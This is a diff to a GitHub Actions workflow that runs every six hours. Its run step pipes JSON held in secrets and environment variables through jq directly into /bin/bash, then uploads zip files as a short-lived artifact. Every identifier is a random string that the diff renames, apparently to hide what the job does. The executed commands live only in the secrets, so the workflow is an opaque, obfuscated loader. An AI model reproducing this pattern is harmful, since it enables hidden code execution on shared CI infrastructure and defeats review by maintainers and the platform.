@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '15 0,6,12,18 * * *'
+    - cron: '37 0,6,12,18 * * *'
 jobs:
   scheduler:
     runs-on: ubuntu-latest
@@ -12,17 +12,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          bipg3710: ${{ secrets.bipg3710 }}
+          vriej791: ${{ secrets.vriej791 }}
         run: |
-          printf '%s' "$bipg3710" | jq -r .r3088 | /bin/bash
-          echo $sbne18 | jq -r .j39875 | /bin/bash
-          printf '%s' "$rbpw30312" | jq -r .wumlv64 | /bin/bash
-          echo $wgw90673 | jq -r .h1 | /bin/bash
-          printf '%s' "$hij423" | jq -r .uuu548 | /bin/bash
+          printf '%s' "$vriej791" | jq -r .erfsu593 | /bin/bash
+          printf '%s' "$nhdht8959" | jq -r .xx3 | /bin/bash
+          echo $qt3 | jq -r .drhn2638 | /bin/bash
+          printf '%s' "$tsw2766" | jq -r .wj209 | /bin/bash
+          echo $vjn9192 | jq -r .fdw3801 | /bin/bash
+          printf '%s' "$ndw72029" | jq -r .sqwhd3 | /bin/bash
+          echo $ylfsu38548 | jq -r .ukug63779 | /bin/bash
+          echo $ikxy3903 | jq -r .kpn976 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
         with:
-          name: gi54dlyW
+          name: GZA6Fcv9
           path: "*.zip"
           retention-days: 1
